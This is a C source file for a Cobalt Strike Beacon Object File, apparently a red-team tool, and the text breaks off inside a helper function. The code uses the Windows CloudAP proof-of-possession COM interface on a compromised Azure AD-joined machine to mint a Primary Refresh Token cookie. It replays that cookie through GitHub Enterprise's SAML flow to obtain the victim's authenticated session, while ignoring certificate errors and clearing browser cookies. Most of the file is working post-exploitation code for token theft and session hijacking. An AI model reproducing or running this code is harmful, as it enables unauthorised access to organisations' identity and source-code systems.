// ==================== SAML + PRT FLOW DOCUMENTATION ====================
// This BOF implements a SAML 2.0 authentication flow to access GitHub Enterprise
// that uses Azure AD (Microsoft Entra ID) as its identity provider.
// The flow leverages a Primary Refresh Token (PRT) for seamless SSO authentication.
//
// AUTHENTICATION FLOW:
//
// PRT ACQUISITION (Prerequisites):
//   1. GET /Common/oauth2/authorize (login.microsoftonline.com)
//      Purpose: Retrieve Azure AD nonce for PRT request
//      Method: GET
//      Response: JavaScript config containing nonce value
//      Extracts: nonce from $Config JSON object
//
//   2. COM Interface: IProofOfPossessionCookieInfoManager
//      Purpose: Request PRT cookie using Windows CloudAP plugin
//      CLSID: {A9927F85-A304-4390-8B23-A75F1C668600}
//      IID: {CDAECE56-4EDF-43DF-B113-88E4556FA1BB}
//      Method: GetCookieInfoForUri with nonce-embedded URI
//      URI Format: https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}
//      Returns: x-ms-refreshtokencredential cookie containing signed PRT token
//      Note: Requires device to be Azure AD joined/registered with valid PRT
//
// REQUEST 1: GET /enterprises/{name}/sso (GitHub)
//   Purpose: Obtain CSRF token and session cookies from GitHub Enterprise
//   Method: GET
//   Response: HTML page containing authenticity_token
//   Extracts: authenticity_token value from hidden form field
//   Cookies: Establishes session cookies (_gh_sess, etc.) in CookieJar
//
// REQUEST 2: POST /enterprises/{name}/saml/initiate (GitHub)
//   Purpose: Initiate SAML authentication flow with Azure AD
//   Method: POST
//   Body: authenticity_token={url_encoded_token}
//   Response: HTML with meta refresh tag containing Azure AD authorization URL
//   Extracts: data-url attribute with full Azure AD SAML request URL
//   Note: GitHub generates the SAMLRequest with proper claims and RelayState
//
// REQUEST 3: GET Azure AD Authorization URL (Azure AD)
//   Purpose: Authenticate to Azure AD using PRT and obtain SAML assertion
//   Method: GET
//   Headers: Cookie: x-ms-refreshtokencredential={prt_cookie}
//   Response: HTML form with auto-submit containing SAMLResponse and RelayState
//   Extracts: - SAMLResponse (name="SAMLResponse" value="...")
//            - RelayState (name="RelayState" value="...")
//
// REQUEST 4: POST /enterprises/{name}/saml/consume (GitHub)
//   Purpose: Submit SAML assertion to GitHub to establish authenticated session
//   Method: POST (attempted twice for cookie handling)
//   Body: SAMLResponse={url_encoded_saml_response}&RelayState={relay_state}
//   Response: HTTP 302 redirect + Set-Cookie with authenticated session cookies
//   Extracts: user_session cookie (GitHub session token)
//   Note: Two POST attempts ensure all cookies are properly set (First request wont get session cookie)

#include <Windows.h>
#include "base\helpers.h"
#ifdef _DEBUG
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "user32.lib")

#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"
#include <stdio.h>
#include <winternl.h>
#include <sspi.h>
#include "bofdefs.h"
#include <wininet.h>

// ==================== CONFIGURATION - MODIFY THESE ====================
// Domain and network configuration
#define TARGET_DOMAIN "antrovmp"
#define GITHUB_HOST "github.com"
#define AZURE_AD_HOST "login.microsoftonline.com"

// Proxy Configuration
#define USE_PROXY TRUE
#define PROXY_ADDRESS "127.0.0.1:8080"

// HTTP Configuration
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0"
#define MAX_REDIRECTS 10

// Paths
#define GITHUB_SSO_PATH "/enterprises/antrovmp/sso"
#define GITHUB_SAML_INITIATE_PATH "/enterprises/antrovmp/saml/initiate"
#define GITHUB_SAML_CONSUME_PATH "/enterprises/antrovmp/saml/consume"

// Buffer sizes
#define CHUNK_SIZE 8192
#define HOST_BUFFER_SIZE 256
#define PATH_BUFFER_SIZE 2048
#define HEADER_BUFFER_SIZE 4096
#define REFERER_BUFFER_SIZE 2048
#define MAX_NONCE_SIZE 512
#define MAX_PRT_SIZE 8192
#define MAX_COOKIES 10

#ifndef INTERNET_FLAG_NO_COOKIES
#define INTERNET_FLAG_NO_COOKIES 0x00080000
#endif

// ==================== Cookie Management Structures ====================
    typedef struct {
        char* cookies[MAX_COOKIES];
        int count;
    } CookieJar;

    // ==================== PRT COM Interfaces ====================
    typedef struct ProofOfPossessionCookieInfo {
        LPWSTR name;
        LPWSTR data;
        DWORD flags;
        LPWSTR p3pHeader;
    } ProofOfPossessionCookieInfo;

    typedef struct {
        char* samlResponse;
        char* relayState;
    } AzureAdAuthResult;

    typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;

    typedef struct IProofOfPossessionCookieInfoManagerVtbl {
        BEGIN_INTERFACE
            HRESULT(STDMETHODCALLTYPE* QueryInterface)(
                IProofOfPossessionCookieInfoManager* This,
                REFIID riid,
                void** ppvObject);
        ULONG(STDMETHODCALLTYPE* AddRef)(IProofOfPossessionCookieInfoManager* This);
        ULONG(STDMETHODCALLTYPE* Release)(IProofOfPossessionCookieInfoManager* This);
        HRESULT(STDMETHODCALLTYPE* GetCookieInfoForUri)(
            IProofOfPossessionCookieInfoManager* This,
            LPCWSTR uri,
            DWORD* cookieInfoCount,
            ProofOfPossessionCookieInfo** cookieInfo);
        END_INTERFACE
    } IProofOfPossessionCookieInfoManagerVtbl;

    interface IProofOfPossessionCookieInfoManager{
        CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl* lpVtbl;
    };

    // ==================== FUNCTION DECLARATIONS ====================
    static void print_last_error(const char* msg);
    char* retrieveParamValue(const char* data, DWORD len, const char* param);
    static int append_bytes(char** out, size_t* out_len, size_t* out_cap, const char* src, size_t src_len);
    char* extract_authenticity_token(const char* data, size_t len);
    char* extract_saml_response(const char* data, size_t len, char* key);
    char* url_encode(const char* str);
    char* get_location_header(HINTERNET hRequest);
    void parse_url(const char* url, char* host, size_t host_size, char* path, size_t path_size, INTERNET_PORT* port, BOOL* is_https);

    // Cookie Management Functions
    void init_cookie_jar(CookieJar* jar);
    void free_cookie_jar(CookieJar* jar);
    void extract_all_cookies_from_response(HINTERNET hRequest, CookieJar* jar);
    char* build_cookie_header(CookieJar* jar);
    void add_cookie_to_jar(CookieJar* jar, const char* cookie);

    HINTERNET setup_http_session();
    HINTERNET create_http_request(HINTERNET hConnect, const char* method, const char* path, const char* referer, DWORD flags);
    BOOL send_http_request(HINTERNET hRequest, const char* headers, const char* postData, DWORD postDataLen);
    char* read_http_response(HINTERNET hRequest, size_t* resp_len);

    // PRT Functions
    BOOL GetAADNonce(char* nonce_out, size_t nonce_size);
    char* RequestAADPRT(const char* nonce);

    // Request Functions
    char* perform_request_1_get_sso_page(HINTERNET hSession, HINTERNET hConnect, CookieJar* cookieJar);
    char* perform_request_2_post_saml_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar);
    BOOL perform_request_3_azure_ad_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, char** outSamlResponse, char** outRelayState);
    void perform_request_4_post_saml_consume(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* relayState, CookieJar* cookieJar);

    void clear_all_cookies();
    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
    unsigned __stdcall performSAML(void* p);

    // ==================== Entry Point ====================
    void go(PCHAR args, int len) {
        DWORD exitcode = 0;
        HANDLE thread = NULL;
        PVOID eHandler = NULL;
        eHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
        thread = (HANDLE)_beginthreadex(NULL, 0, performSAML, NULL, 0, NULL);
        WaitForSingleObject(thread, INFINITE);
        GetExitCodeThread(thread, &exitcode);
        if (exitcode != 0) {
            BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x\n", exitcode);
        }
        if (thread) { CloseHandle(thread); }
        if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
    }

    // ==================== Cookie Management Functions ====================
    void init_cookie_jar(CookieJar* jar) {
        jar->count = 0;
        for (int i = 0; i < MAX_COOKIES; i++) {
            jar->cookies[i] = NULL;
        }
    }

    void free_cookie_jar(CookieJar* jar) {
        for (int i = 0; i < jar->count; i++) {
            if (jar->cookies[i]) {
                intFree(jar->cookies[i]);
                jar->cookies[i] = NULL;
            }
        }
        jar->count = 0;
    }

    void add_cookie_to_jar(CookieJar* jar, const char* cookie) {
        if (jar->count >= MAX_COOKIES) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Cookie jar is full");
            return;
        }

        size_t cookieLen = strlen(cookie);
        jar->cookies[jar->count] = (char*)intAlloc(cookieLen + 1);
        if (jar->cookies[jar->count]) {
            memcpy(jar->cookies[jar->count], cookie, cookieLen);
            jar->cookies[jar->count][cookieLen] = '\0';
            jar->count++;
        }
    }

    void extract_all_cookies_from_response(HINTERNET hRequest, CookieJar* jar) {
        DWORD index = 0;
        char* buffer = (char*)intAlloc(HEADER_BUFFER_SIZE);

        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for cookie buffer");
            return;
        }

        DWORD bufferSize = HEADER_BUFFER_SIZE;

        // Iterate through all Set-Cookie headers
        while (HttpQueryInfoA(hRequest, HTTP_QUERY_SET_COOKIE, buffer, &bufferSize, &index) && jar->count < MAX_COOKIES) {
            // Extract name=value (stop at first semicolon)
            char* semicolon = strchr(buffer, ';');
            size_t cookieLen;

            if (semicolon) {
                cookieLen = semicolon - buffer;
            }
            else {
                cookieLen = strlen(buffer);
            }

            char* cookie = (char*)intAlloc(cookieLen + 1);
            if (cookie) {
                memcpy(cookie, buffer, cookieLen);
                cookie[cookieLen] = '\0';

                // Check if cookie with same name already exists, replace it
                char* equals = strchr(cookie, '=');
                if (equals) {
                    size_t nameLen = equals - cookie;
                    BOOL found = FALSE;

                    for (int i = 0; i < jar->count; i++) {
                        if (strncmp(jar->cookies[i], cookie, nameLen) == 0 && jar->cookies[i][nameLen] == '=') {
                            // Replace existing cookie
                            intFree(jar->cookies[i]);
                            jar->cookies[i] = cookie;
                            found = TRUE;
                            break;
                        }
                    }

                    if (!found) {
                        jar->cookies[jar->count] = cookie;
                        jar->count++;
                    }
                }
                else {
                    intFree(cookie);
                }
            }

            bufferSize = HEADER_BUFFER_SIZE;
        }

        intFree(buffer);
    }

    char* build_cookie_header(CookieJar* jar) {
        if (jar->count == 0) return NULL;

        // Calculate total size needed
        size_t totalSize = 0;
        for (int i = 0; i < jar->count; i++) {
            totalSize += strlen(jar->cookies[i]);
            if (i < jar->count - 1) totalSize += 2; // "; "
        }
        totalSize += 1; // null terminator

        char* cookieHeader = (char*)intAlloc(totalSize);
        if (!cookieHeader) return NULL;

        char* pos = cookieHeader;
        for (int i = 0; i < jar->count; i++) {
            size_t len = strlen(jar->cookies[i]);
            memcpy(pos, jar->cookies[i], len);
            pos += len;

            if (i < jar->count - 1) {
                *pos++ = ';';
                *pos++ = ' ';
            }
        }
        *pos = '\0';

        return cookieHeader;
    }

    // ==================== Main Function ====================
    unsigned __stdcall performSAML(void* p) {
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        char* authenticityToken = NULL;
        char* azureAdRedirectUrl = NULL;
        char* samlResponse = NULL;
        char* relayState = NULL;
        char* nonce = NULL;
        char* prtCookie = NULL;
        CookieJar cookieJar = { 0 };

        init_cookie_jar(&cookieJar);
        clear_all_cookies();

        // Setup HTTP session
        hSession = setup_http_session();
        if (!hSession) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to setup HTTP session");
            goto cleanup;
        }

        // Connect to GitHub
        hConnect = InternetConnectA(
            hSession,
            GITHUB_HOST,
            INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        if (!hConnect) {
            print_last_error("[!] InternetConnect to GitHub failed");
            goto cleanup;
        }

        // ==================== REQUEST 1: GET SSO Page ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 1: GET GitHub Enterprise SSO Page");
        authenticityToken = perform_request_1_get_sso_page(hSession, hConnect, &cookieJar);
        if (!authenticityToken) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 1 FAILED: Could not extract authenticity_token");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token");

        if (cookieJar.count == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 1 FAILED: No cookies received");
            goto cleanup;
        }

        // ==================== REQUEST 2: POST SAML Initiate ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST SAML Initiate Request");
        azureAdRedirectUrl = perform_request_2_post_saml_initiate(hSession, hConnect, authenticityToken, &cookieJar);
        if (!azureAdRedirectUrl) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 2 FAILED: No redirect URL to Azure AD");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 2 SUCCESS: Received Azure AD redirect URL");

        // ==================== Get Azure AD Nonce ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Retrieving Azure AD Nonce");
        nonce = (char*)intAlloc(MAX_NONCE_SIZE);
        if (!nonce) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate memory for nonce");
            goto cleanup;
        }
        if (!GetAADNonce(nonce, MAX_NONCE_SIZE)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve Azure AD nonce");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully retrieved Azure AD nonce");

        // ==================== Request PRT Cookie ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Requesting PRT Cookie");
        prtCookie = RequestAADPRT(nonce);
        if (!prtCookie) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve PRT cookie");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully retrieved PRT cookie");

        // ==================== REQUEST 3: Azure AD Authentication ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: Azure AD SAML Authentication with PRT");
        if (!perform_request_3_azure_ad_auth(hSession, azureAdRedirectUrl, prtCookie, &samlResponse, &relayState)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse from Azure AD");
            goto cleanup;
        }
        if (!samlResponse || !relayState) {
            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse or RelayState retrieved");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 3 SUCCESS: Retrieved SAMLResponse from Azure AD");

        // ==================== REQUEST 4: POST SAMLResponse to GitHub ====================
        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: POST SAMLResponse to GitHub Consume Endpoint");
        perform_request_4_post_saml_consume(hSession, hConnect, samlResponse, relayState, &cookieJar);

    cleanup:
        free_cookie_jar(&cookieJar);
        if (samlResponse) intFree(samlResponse);
        if (prtCookie) intFree(prtCookie);
        if (nonce) intFree(nonce);
        if (azureAdRedirectUrl) intFree(azureAdRedirectUrl);
        if (authenticityToken) intFree(authenticityToken);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hSession) InternetCloseHandle(hSession);
        clear_all_cookies();

        return 0;
    }

    // ==================== PRT RETRIEVAL FUNCTIONS ====================
    BOOL GetAADNonce(char* nonce_out, size_t nonce_size) {
        char* fullBuffer = NULL;
        size_t resp_len = 0;
        BOOL success = FALSE;
        DWORD secFlags = 0;
        const char* headers = "UA-CPU: AMD64\r\n";
        const char* acceptTypes[] = { "*/*", NULL };
        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

        hSession = InternetOpenA(
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)",
            USE_PROXY ? INTERNET_OPEN_TYPE_PROXY : INTERNET_OPEN_TYPE_PRECONFIG,
            USE_PROXY ? PROXY_ADDRESS : NULL,
            0,
            0
        );

        if (!hSession) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize WinINET session for nonce");
            return FALSE;
        }

        hConnect = InternetConnectA(
            hSession,
            AZURE_AD_HOST,
            INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );

        if (!hConnect) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to login.microsoftonline.com");
            goto cleanup;
        }

        hRequest = HttpOpenRequestA(
            hConnect,
            "GET",
            "/Common/oauth2/authorize?resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&response_type=code&haschrome=1&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient",
            "HTTP/1.1",
            NULL,
            acceptTypes,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES,
            0
        );

        if (!hRequest) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create HTTP request for nonce");
            goto cleanup;
        }

        // Ignore cert errors
        secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

        if (!HttpAddRequestHeadersA(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add request headers");
            goto cleanup;
        }

        if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to send HTTP request for nonce");
            goto cleanup;
        }

        // Read response
        resp_len = 0;
        fullBuffer = read_http_response(hRequest, &resp_len);
        if (fullBuffer && resp_len > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Response size: %lu bytes", resp_len);
            char* configStart = strstr(fullBuffer, "$Config=");
            if (configStart) {
                char* nonceStart = strstr(configStart, "nonce\":\"");
                if (nonceStart) {
                    nonceStart += 8; // Length of "nonce\":\""
                    char* nonceEnd = strstr(nonceStart, "\"");
                    if (nonceEnd) {
                        size_t nonceLen = nonceEnd - nonceStart;
                        if (nonceLen < nonce_size) {
                            memcpy(nonce_out, nonceStart, nonceLen);
                            nonce_out[nonceLen] = '\0';
                            success = TRUE;
                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Extracted nonce: %.50s...", nonce_out);
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR, "[-] Nonce too large for buffer");
                        }
                    }
                }
            }
            intFree(fullBuffer);
        }

    cleanup:
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hSession) InternetCloseHandle(hSession);
        return success;
    }

    char* RequestAADPRT(const char* nonce) {
        HRESULT hr = S_OK;
        DWORD cookieCount = 0;
        size_t totalLen = 0;
        ProofOfPossessionCookieInfo* cookies = NULL;
        IProofOfPossessionCookieInfoManager* popCookieManager = NULL;
        GUID CLSID_ProofOfPossessionCookieInfoManager;
        GUID IID_IProofOfPossessionCookieInfoManager;
        wchar_t* uri = NULL;
        wchar_t* wNonce = NULL;
        char* prtCookie = NULL;
        BOOL success = FALSE;

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting PRT request with nonce");

        // Convert nonce to wide string
        int nonceLen = strlen(nonce);
        wNonce = (wchar_t*)intAlloc((nonceLen + 1) * sizeof(wchar_t));
        if (!wNonce) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for wide nonce");
            return NULL;
        }
        MultiByteToWideChar(CP_UTF8, 0, nonce, -1, wNonce, nonceLen + 1);

        // Build URI
        size_t uriLen = wcslen(L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=") + wcslen(wNonce) + 1;
        uri = (wchar_t*)intAlloc(uriLen * sizeof(wchar_t));
        if (!uri) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for URI");
            goto cleanup;
        }
        wsprintfW(uri, L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s", wNonce);

        hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed: 0x%08lx", hr);
            goto cleanup;
        }

        hr = CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] CLSIDFromString failed: 0x%08lx", hr);
            goto cleanup;
        }

        hr = IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] IIDFromString failed: 0x%08lx", hr);
            goto cleanup;
        }

        hr = CoCreateInstance(CLSID_ProofOfPossessionCookieInfoManager,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_IProofOfPossessionCookieInfoManager,
            (void**)&popCookieManager);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance failed: 0x%08lx", hr);
            goto cleanup;
        }

        hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] GetCookieInfoForUri failed: 0x%08lx", hr);
            goto cleanup;
        }

        if (cookieCount == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] No PRT cookies found");
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %lu PRT cookies", cookieCount);

        // Build cookie string for HTTP requests
        for (DWORD i = 0; i < cookieCount; i++) {
            if (cookies[i].name && cookies[i].data) {
                totalLen += wcslen(cookies[i].name) + wcslen(cookies[i].data) + 10; // Extra space for "=; "
            }
        }

        if (totalLen > 0) {
            prtCookie = (char*)intAlloc(totalLen * 2 + 1); // Extra space for wide to multibyte conversion
            if (prtCookie) {
                char* pos = prtCookie;
                for (DWORD i = 0; i < cookieCount; i++) {
                    if (cookies[i].name && cookies[i].data) {
                        int dataLen = WideCharToMultiByte(CP_UTF8, 0, cookies[i].data, -1, NULL, 0, NULL, NULL);
                        // Allocate temporary buffer for the full cookie data
                        char* tempData = (char*)intAlloc(dataLen);
                        if (tempData) {
                            WideCharToMultiByte(CP_UTF8, 0, cookies[i].data, -1, tempData, dataLen, NULL, NULL);

                            // Find and strip cookie attributes (everything after first semicolon)
                            char* semicolon = strchr(tempData, ';');
                            if (semicolon) {
                                *semicolon = '\0';
                            }

                            // Trim trailing whitespace
                            char* end = tempData + strlen(tempData) - 1;
                            while (end > tempData && (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n')) {
                                *end = '\0';
                                end--;
                            }

                            if (i > 0) {
                                *pos++ = ';';
                                *pos++ = ' ';
                            }

                            // Copy the cleaned token value
                            int cleanLen = strlen(tempData);
                            memcpy(pos, tempData, cleanLen);
                            pos += cleanLen;

                            intFree(tempData);
                        }
                    }
                }
                *pos = '\0';
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] PRT Cookie string built: %.100s...", prtCookie);
            }
        }

        // Cleanup cookies
        for (DWORD i = 0; i < cookieCount; i++) {
            if (cookies[i].name) CoTaskMemFree(cookies[i].name);
            if (cookies[i].data) CoTaskMemFree(cookies[i].data);
            if (cookies[i].p3pHeader) CoTaskMemFree(cookies[i].p3pHeader);
        }

    cleanup:
        if (cookies) {
            CoTaskMemFree(cookies);
        }
        if (popCookieManager) {
            popCookieManager->lpVtbl->Release(popCookieManager);
        }
        if (wNonce) intFree(wNonce);
        if (uri) intFree(uri);
        CoUninitialize();

        return prtCookie;
    }

    // ==================== HTTP SESSION SETUP ====================
    HINTERNET setup_http_session() {
        // First, aggressively clear everything
        InternetSetOptionA(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0);
        InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
        InternetSetOptionA(0, 42, NULL, 0);

        HINTERNET hSession = InternetOpenA(
            USER_AGENT,
            USE_PROXY ? INTERNET_OPEN_TYPE_PROXY : INTERNET_OPEN_TYPE_PRECONFIG,
            USE_PROXY ? PROXY_ADDRESS : NULL,
            0,
            0
        );

        if (!hSession) {
            print_last_error("[!] InternetOpen failed");
            return NULL;
        }

        // Disable automatic cookie handling
        DWORD dwFlags = INTERNET_COOKIE_HTTPONLY;
        InternetSetOptionA(hSession, INTERNET_OPTION_SUPPRESS_BEHAVIOR, &dwFlags, sizeof(dwFlags));

        return hSession;
    }

    // ==================== HTTP REQUEST HELPERS ====================
    HINTERNET create_http_request(HINTERNET hConnect, const char* method, const char* path, const char* referer, DWORD flags) {
        const char* acceptTypes[] = { "*/*", NULL };

        // Add NO_COOKIES flag to disable automatic cookie handling
        flags |= INTERNET_FLAG_NO_COOKIES;

        HINTERNET hRequest = HttpOpenRequestA(
            hConnect,
            method,
            path,
            "HTTP/1.1",
            referer,
            acceptTypes,
            flags,
            0
        );

        if (!hRequest) {
            print_last_error("[!] HttpOpenRequest failed");
            return NULL;
        }

        // Ignore cert errors
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

        return hRequest;
    }

    BOOL send_http_request(HINTERNET hRequest, const char* headers, const char* postData, DWORD postDataLen) {
        if (headers) {
            if (!HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE)) {
                print_last_error("[!] HttpAddRequestHeaders failed");
                return FALSE;
            }
        }

        if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)postData, postDataLen)) {
            print_last_error("[!] HttpSendRequest failed");
            return FALSE;
        }

        return TRUE;
    }

    char* read_http_response(HINTERNET hRequest, size_t* resp_len) {
        char* chunk = (char*)intAlloc(CHUNK_SIZE);
        if (!chunk) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for read buffer");
            return NULL;
        }

        DWORD read = 0;
        char* resp = NULL;
        size_t resp_cap = 0;
        *resp_len = 0;

        while (InternetReadFile(hRequest, chunk, CHUNK_SIZE, &read) && read > 0) {
            if (!append_bytes(&resp, resp_len, &resp_cap, chunk, (size_t)read)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Out of memory while buffering response");
                intFree(chunk);
                if (resp) intFree(resp);
                return NULL;
            }
        }

        intFree(chunk);
        return resp;
    }

    // ==================== REQUEST 1: GET SSO PAGE ====================
    char* perform_request_1_get_sso_page(HINTERNET hSession, HINTERNET hConnect, CookieJar* cookieJar) {
        char* token = NULL;
        char* resp = NULL;
        size_t resp_len = 0;
        HINTERNET hRequest = NULL;

        const char* headers =
            "Upgrade-Insecure-Requests: 1\r\n"
            "Cache-Control: no-cache\r\n"
            "Pragma: no-cache\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n";

        // Clear any existing cookies
        InternetSetOptionA(0, 42, NULL, 0);

        hRequest = create_http_request(
            hConnect,
            "GET",
            GITHUB_SSO_PATH,
            NULL,
            INTERNET_FLAG_SECURE |
            INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_RELOAD |
            INTERNET_FLAG_PRAGMA_NOCACHE
            // NO_COOKIES flag is added in create_http_request
        );

        if (!hRequest) {
            goto cleanup;
        }

        if (!send_http_request(hRequest, headers, NULL, 0)) {
            goto cleanup;
        }

        // Extract all cookies from response
        extract_all_cookies_from_response(hRequest, cookieJar);
        if (cookieJar->count == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] No cookies received from first request");
        }

        resp = read_http_response(hRequest, &resp_len);
        if (!resp) {
            goto cleanup;
        }

        token = extract_authenticity_token(resp, resp_len);
        if (!token) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not find authenticity_token in response");
        }

    cleanup:
        if (resp) intFree(resp);
        if (hRequest) InternetCloseHandle(hRequest);
        return token;
    }

    // ==================== HELPER: Extract Meta Refresh URL ====================
    char* ExtractSAMLUrl(const char* data, size_t len) {
        const char* end = data + len;
        const char needle[] = "data-url=\"";
        const size_t needle_len = sizeof(needle) - 1;
        const char* p = data;

        while (p + needle_len < end) {
            const char* hit = NULL;
            for (const char* s = p; s + needle_len < end; ++s) {
                if (*s == 'd' && (size_t)(end - s) >= needle_len &&
                    memcmp(s, needle, needle_len) == 0) {
                    hit = s;
                    break;
                }
            }

            if (!hit) {
                // Try case insensitive search for data-url
                for (const char* s = p; s + 10 < end; ++s) {
                    if ((*s == 'd' || *s == 'D') &&
                        _strnicmp(s, "data-url", 8) == 0) {
                        // Found data-url, now look for ="
                        const char* eq_check = s + 8;
                        while (eq_check < end && (*eq_check == ' ' || *eq_check == '=')) {
                            eq_check++;
                        }
                        if (eq_check < end && (*eq_check == '"' || *eq_check == '\'')) {
                            hit = eq_check + 1; // Position after opening quote
                            break;
                        }
                    }
                }
            }
            else {
                hit += needle_len; // Position after data-url="
